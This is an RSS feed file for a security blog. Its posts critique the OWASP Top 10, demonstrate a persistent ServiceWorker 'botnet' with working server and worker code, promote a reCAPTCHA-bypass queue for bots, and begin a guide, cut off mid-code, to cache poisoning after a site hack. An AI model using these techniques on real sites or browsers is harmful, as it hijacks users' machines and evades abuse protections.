@@ -1,0 +1,854 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="https://www.w3.org/2005/Atom">
+  <channel>
+    <title>The Sakurity Blog</title>
+    <description>Infosec Playboy.
+</description>
+    <link>https://sakurity.com/blog/</link>
+    <atom:link href="https://sakurity.com/blog/feed.xml" rel="self" type="application/rss+xml"/>
+    <pubDate>Sat, 04 Nov 2017 11:46:11 +0300</pubDate>
+    <lastBuildDate>Sat, 04 Nov 2017 11:46:11 +0300</lastBuildDate>
+    <generator>Jekyll v3.4.3</generator>
+    
+      <item>
+        <title>Why OWASP Top 10 is no longer relevant</title>
+        <description>&lt;p&gt;At this point, OWASP Top 10 is considered one and the only bridge between security researchers and developers. There are some books and blog posts here and there but if you’re looking for “top threats &amp;amp; vulnerabilities” that’s what you will be offered by others including Google.&lt;/p&gt;
+
+&lt;p&gt;Unfortunately OWASP is out of touch with reality. First Top10 was released in 2003 and back then the web was a mess. CSRF? Everywhere. XSS? Give me a minute. SQL injection? Just try another parameter.&lt;/p&gt;
+
+&lt;p&gt;Now most misdesigned vectors are treated on framework level (and you should always use one - don’t build a house from scratch, reuse blocks that have proven track record). I will use Rails as an example but others are very similar.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Top_10_2017-Top_10&quot;&gt;Let’s take up-to-date list from here&lt;/a&gt; and comment every item.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;img/owasp.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;A1. Injection - not going to happen with major frameworks. There are some corner cases such as &lt;a href=&quot;https://rails-sqli.org/&quot;&gt;barely used ORM methods&lt;/a&gt; which could be fixed by renaming “calculate” to “unsafe_calculate”. In fact every library developer should expose dangerous method with “unsafe_” prefix if you care about your users.&lt;/p&gt;
+
+&lt;p&gt;Injection is still a relevant threat but only because ORM developers made naming mistakes.&lt;/p&gt;
+
+&lt;p&gt;A2 Broken Authentication and Session Management - session management is long time solved problem since we all use auth libraries.&lt;/p&gt;
+
+&lt;p&gt;Seriously do not roll out your own auth library, use Devise or Omniauth. They pop first during the audits.&lt;/p&gt;
+
+&lt;p&gt;A3. XSS - (should be under A1 Injection) is generally solved problem. The output uses templates, client side frameworks use templates, corner cases like JSON-in-script-tag is also solved. Try to put '&quot;&amp;gt;&amp;lt;img src=x onerror=alert(0)&amp;gt; in every input you see on a website (some people do it for a living) - yields nothing these days.&lt;/p&gt;
+
+&lt;p&gt;There are still ways you can be hit by 3rd party libraries but there’s nothing you can do as a developer. Just don’t &lt;code class=&quot;highlighter-rouge&quot;&gt;html_safe&lt;/code&gt; on unsafe strings. Obvious.&lt;/p&gt;
+
+&lt;p&gt;A4 - Broken Access Control. Unfortunatelly business logic and access management isn’t a solved problem. The best approach is to always chain your code as current_user.comments.find(params[:comment_id]) and manually assign things like topic_id (instead of mass assign) so the access is checked on all read/write operations. CanCan is also a great solution.&lt;/p&gt;
+
+&lt;p&gt;A5 - Security Misconfiguration. This is good one and there’s nothing a framework can do for you. There are things like Redis that is exposed by default. There’s not much you can do about your coding style, just read manuals carefully and listen to others.&lt;/p&gt;
+
+&lt;p&gt;A6 - Sensitive Data Exposure. You must be using https by now. Just use LetsEncrypt. Not worth a dedicated item.&lt;/p&gt;
+
+&lt;p&gt;A7 - Insufficient Attack Protection. &lt;a href=&quot;http://www.skeletonscribe.net/2017/04/abusing-owasp.html&quot;&gt;That’s the last straw that made me write this post.&lt;/a&gt; So now companies like Contrast Security can use OWASP to literally add “A7. Not enough of Contrast Security”.&lt;/p&gt;
+
+&lt;p&gt;A8 - CSRF. Solved problem. State-changing action must be non-GET and non-GET should require authenticity_token - simple as that.&lt;/p&gt;
+
+&lt;p&gt;A9 - Using Components with Known Vulnerabilities - patch your stuff when CVE is out. Far from a solved problem but regular “bundle update” is all you can do.&lt;/p&gt;
+
+&lt;p&gt;A10 - Underprotected APIs. Frankly, this one is written for complete noobs. If you don’t realize that the attacker can fake arbitrary requests looking like from JS or mobile app, you’re not ready to write production code.&lt;/p&gt;
+
+&lt;p&gt;We are left with A1, A4, A5 and A9 as somewhat relevant and a dozen of other attack vectors common app faces with no single mention.&lt;/p&gt;
+
+&lt;p&gt;From top of my head:&lt;/p&gt;
+
+&lt;p&gt;Race conditions - Look at &lt;a href=&quot;https://magoo.github.io/Blockchain-Graveyard/&quot;&gt;BlockChain Graveyard&lt;/a&gt; (ironically the Graveyard is great OWASP replacement with sorting by damage). Only few mentions race condition (many reasons are undisclosed) but reality is harsh.&lt;/p&gt;
+
+&lt;p&gt;SSRF - Webhooks, download this URL, instant payment notifications etc&lt;/p&gt;
+
+&lt;p&gt;OAuth - &lt;a href=&quot;https://sakurity.com/oauth&quot;&gt;There is a list of known OAuth design flaws&lt;/a&gt; and that doesn’t fit into a single item of Top10.&lt;/p&gt;
+
+&lt;p&gt;If you aren’t maintaining some PHP app written 10 years ago, Top 10 list is irrelevant to you. By reading Top 10 you gain no useful knowledge. It’s now just a marketing term and rather good indicator the company using it is a snake-oil. No, it’s not even a “good start”.&lt;/p&gt;
+
+&lt;p&gt;Many years ago when websites had more vulnerabilities than features, it was a nice short list to get basic sense of what secure coding is. Now it is not enough.&lt;/p&gt;
+
+&lt;p&gt;It’s also true there’s no alternative. There’s no one big bible about all known platform-specific bugs. Creating one would be a very hard task and honestly not in best interest of us, security researchers.&lt;/p&gt;
+</description>
+        <pubDate>Mon, 24 Apr 2017 00:00:00 +0300</pubDate>
+        <link>https://sakurity.com/blog/2017/04/24/owasp.html</link>
+        <guid isPermaLink="true">https://sakurity.com/blog/2017/04/24/owasp.html</guid>
+        
+        
+      </item>
+    
+      <item>
+        <title>Building Botnet on ServiceWorkers</title>
+        <description>&lt;p&gt;TL;DR In this post I will demonstrate one of the numerous ways how ServiceWorkers let us execute Javascript code inifinitely in the browser and will rant a little bit about ServiceWorkers design.&lt;/p&gt;
+
+&lt;p&gt;For demonstration &lt;a href=&quot;https://jsfiddle.net/Lsd6vgkb/3/&quot;&gt;visit this link&lt;/a&gt;. Close that tab. Few minutes later open DevTools/Application/ServiceWorkers/Show All and see it running. (could be fixed by now though)&lt;/p&gt;
+
+&lt;p&gt;This Catworker runs infinitely, and like a zombie, executes different tasks. No need for a malicious page, just any https:// blog allowing external images in the comments to plant the payload &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;img src=&quot;https://truefactor.io/cat.gif&quot;&amp;gt;&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Any web developer would be surprised: &lt;b&gt;How come an image tag leads to JS code execution? How come that JS execution is persistant? I never allowed that!&lt;/b&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;serviceworkers-are-overly-complex&quot;&gt;ServiceWorkers are overly complex&lt;/h2&gt;
+
+&lt;p&gt;To make “Progressive” Web Applications popular Chrome team created ServiceWorkers, and they never asked your permission. Currently the only real world use case for that “shiny tech” is to show a Push Notification popup. If you don’t believe me, open your registered service workers and inspect their contents.&lt;/p&gt;
+
+&lt;p&gt;Even that simple trick is overcomplicated - &lt;a href=&quot;https://developers.google.com/web/updates/2015/03/push-notifications-on-the-open-web#implementing_push_messaging_for_chrome&quot;&gt;hunders of lines of code to get started, dependance on FCM etc&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Put sw.js on the server, register a worker on the client side, wait for a Promise, then serviceWorkerRegistration.pushManager.getSubscription(), extract endpoint and registration_id, save those on the server.&lt;/p&gt;
+
+&lt;p&gt;Could be: &lt;code class=&quot;highlighter-rouge&quot;&gt;navigator.pushManager.getSubscription(&quot;We will send you weather updates once an hour&quot;).then(function(endpoint){ #FCM endpoint })&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;In my humble opinion ServiceWorker is a beautiful answer to non existing question. It is way harder to learn than Appcache while being less secure.&lt;/p&gt;
+
+&lt;h2 id=&quot;how-to-keep-it-alive-for-long&quot;&gt;How to keep it alive for long&lt;/h2&gt;
+
+&lt;p&gt;ServiceWorker is killed 60 seconds after it receives last event e.g. onmessage, onfetch, onforeignfetch etc&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;postMessage-ing itself&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;nb&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;addEventListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'message'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;spawnNewMessageEvent&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kp&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Promise&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;setTimeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sw&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;registration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;active&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;sw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;postMessage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;success&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;30000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;waitUntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;doSomething&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;then&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;spawnNewMessageEvent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;Two workers foreignfetch-ing each other. To use a ForeignFetch you need to &lt;a href=&quot;https://bit.ly/OriginTrialSignup&quot;&gt;apply for Origin Trial token&lt;/a&gt; - entirely automatic process, no review/verification, and allows the attacker to use fresh experimental techniques on real users without their consent.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;One catworker doing a fetch to cat.gif, which leads to registration of a new worker with different scope (it’s called Link-based registration), repeat 55 seconds later.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'sinatra'&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;ot&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'AglMWHYLtMNT8FVZp9u368r0HZPKh7Pjfm7WYEyHwKz4zwaSznv682Bckrz903mz54CVZQACD5ZlSrLpuh8CKQIAAABYeyJvcmlnaW4iOiAiaHR0cHM6Ly90cnVlZmFjdG9yLmlvOjQ0MyIsICJmZWF0dXJlIjogIkZvcmVpZ25GZXRjaCIsICJleHBpcnkiOiAxNDg0OTM2NzI3fQ=='&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/cat.gif&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Origin-Trial'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Access-Control-Allow-Origin'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'*'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Link'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&amp;lt;/sw?'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;rand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;999999999&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'&amp;gt;; rel=&quot;serviceworker&quot;; scope=&quot;/'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;rand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;999999999&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'&quot;'&lt;/span&gt;
+
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:skip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+    &lt;span class=&quot;s1&quot;&gt;'ok'&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Content-Type'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;image/gif&quot;&lt;/span&gt;
+    &lt;span class=&quot;no&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'./cat.gif'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;read&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/sw&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Content-Type'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;HTML&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;
+//&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;rand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;999999999&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_s&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;
+setTimeout(function(){
+  console.log(&quot;Forking&quot;)
+  fetch('https://truefactor.io/cat.gif?skip=1&amp;amp;'+Math.random(9999999));
+}, 30000);
+&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;HTML&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h2 id=&quot;how-it-can-be-abused&quot;&gt;How it can be abused?&lt;/h2&gt;
+
+&lt;p&gt;Right now, attackers could benefit from your browser in three quite dangerous ways.&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;DDoS someone (easy to stop by Referer blocklist)&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;memory-hard calculations like scrypt/litecoin mining. I can get only 2000 hashes/sec, but it’s completely free and can scale to millions of machines. &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Functions_and_classes_available_to_workers&quot;&gt;Look through other functions&lt;/a&gt; available inside of a ServiceWorker.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Most dangerous, delayed CSRF. Once you find a CSRF issue on a website you can send a job to all your zombies and abuse their cookies to run some requests on their behalf.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;ServiceWorkers == persistance by design. They run after you close the tab, they randomly recieve ‘sync’ events and wake up, get updated every 24 hours, and if you allowed a website to send Push Notifications, they can also run some JS every time they show a popup. All that stuff is already in production for quite a while.&lt;/p&gt;
+
+&lt;p&gt;There will be more bypasses to keep attacker’s code running. This class of bugs doesn’t get enough attention from the team. &lt;a href=&quot;https://bugs.chromium.org/p/chromium/issues/detail?id=647943&quot;&gt;Reports&lt;/a&gt; &lt;a href=&quot;https://bugs.chromium.org/p/chromium/issues/detail?id=662443&quot;&gt;are&lt;/a&gt; &lt;a href=&quot;https://bugs.chromium.org/p/chromium/issues/detail?id=648836&quot;&gt;public&lt;/a&gt; and given very low priority.&lt;/p&gt;
+
+&lt;p&gt;On top of that, &lt;b&gt;Origin Trials approach is flawed&lt;/b&gt; - anyone can get a Token, anyone can abuse an experimental feature. Must be opt-in via flags only.&lt;/p&gt;
+
+&lt;p&gt;I strongly believe there should be a way to switch off ServiceWorkers with a flag, because for me, it brings nothing to the table (did you read the Cache docs? it’s like rocket science), and I’m not so sure it won’t break Same Origin Policy or whatever in the future, since features are rushed to production with little review…  Here are some more low-sev vulnerabilities: &lt;a href=&quot;https://tools.cisco.com/security/center/viewAlert.x?alertId=43522&quot;&gt;FF&lt;/a&gt;, &lt;a href=&quot;https://bugs.chromium.org/p/chromium/issues/detail?id=422966&quot;&gt;JSONP+XSS=takeover&lt;/a&gt;, &lt;a href=&quot;https://alf.nu/ServiceWorker&quot;&gt;easier to take over sandbox domains&lt;/a&gt;.&lt;/p&gt;
+</description>
+        <pubDate>Sat, 10 Dec 2016 00:00:00 +0300</pubDate>
+        <link>https://sakurity.com/blog/2016/12/10/serviceworker_botnet.html</link>
+        <guid isPermaLink="true">https://sakurity.com/blog/2016/12/10/serviceworker_botnet.html</guid>
+        
+        
+      </item>
+    
+      <item>
+        <title>PrepCAPTCHA, for bots and pentesters</title>
+        <description>&lt;p&gt;&lt;a href=&quot;https://homakov.blogspot.com/2014/12/the-no-captcha-problem.html&quot;&gt;The iframe bug in No CAPTCHA&lt;/a&gt; was fixed long time ago, and now reCAPTCHA 2.0 is pretty secure and widespread. Bypassing it also got a lot harder, now it requires many solutions in a row, making bruteforce infeasible.&lt;/p&gt;
+
+&lt;p&gt;But following neat trick will always be working even though it was &lt;a href=&quot;https://homakov.blogspot.com/2013/05/the-recaptcha-problem.html&quot;&gt;shown 3 years ago&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Before visiting reCAPTCHA-protected victim page, we get victim’s SITEKEY (client side API key for reCAPTCHA) and get challenges on our own. With bunch of prepared “solutions” (g-recaptcha-response values) that are good for ~130 seconds, it’s much easier to:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;run a bot/script/parser/poster, and not mess with a headless browser like PhantomJS&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;test a race condition for reCAPTCHA-protected endpoint&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;buy high-demand tickets (like Burning Man or Machu Picchu) the second after they become available&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/sakurity/prepcaptcha&quot;&gt;PrepCAPTCHA&lt;/a&gt; is centralized Sinatra-based in-memory queue of valid reCAPTCHA solutions. Solving and using are now two separate processes:&lt;/p&gt;
+
+&lt;p&gt;1) Solvers need to run JS snippet in console of the victim’s website (don’t forget to set correct SITEKEY). Solutions are added to PrepCAPTCHA queue.&lt;/p&gt;
+
+&lt;p&gt;2) When your script stumbles upon a reCAPTCHA, it makes a GET request to PrepCAPTCHA.host/?sitekey=CURRENT_SITEKEY to get a valid g-recaptcha-response.&lt;/p&gt;
+
+&lt;p&gt;P.S. for large volumes consider making an extension or hacking existing one to abuse real users’ cookies and get g-recaptcha-response-s on demand w/o any “solving” (1 click experience).&lt;/p&gt;
+</description>
+        <pubDate>Sat, 16 Apr 2016 00:00:00 +0300</pubDate>
+        <link>https://sakurity.com/blog/2016/04/16/prepcaptcha.html</link>
+        <guid isPermaLink="true">https://sakurity.com/blog/2016/04/16/prepcaptcha.html</guid>
+        
+        
+      </item>
+    
+      <item>
+        <title>Using Appcache and ServiceWorker for Evil</title>
+        <description>&lt;p&gt;You’re a bad guy and you just hacked a website. Normally you leak the database and leave. The owner fixes everything next day and removes your backdoor. With Middlekit techniques you can poison browser cache of every visitor and get more money and intelligence in a long run.&lt;/p&gt;
+
+&lt;p&gt;They call it “Advanced Persistent Threat” in the cyber snake oil industry. It silently sits in the victim’s user agent and waits for your commands. It can alter responses, proxy requests through your server etc - it is permanent session hijacking and XSS.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/mk.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I am not going to give you specific software, but will explain two approaches: appcache and serviceworker.&lt;/p&gt;
+
+&lt;h2 id=&quot;appcache&quot;&gt;&lt;a href=&quot;https://www.html5rocks.com/en/tutorials/appcache/beginner/&quot;&gt;Appcache&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;It works &lt;a href=&quot;https://caniuse.com/#search=appcache&quot;&gt;in all browsers&lt;/a&gt;. You just need to add manifest itself in the CACHE MANIFEST section and &lt;strong&gt;the browser will always return poisoned documents from the cache&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;You need to collect as many URLs as possible - you need to list them explicitly to make the user agent cache it. site:victim.com in google is a good start&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'open-uri'&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'https://www.google.ru/search?q=site%3Asakurity.com&amp;amp;oq=site%3Asakurity.com&amp;amp;aqs=chrome..69i57j69i58.2444j0j9&amp;amp;sourceid=chrome&amp;amp;es_sm=91&amp;amp;ie=UTF-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;read&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_pages&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;domain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
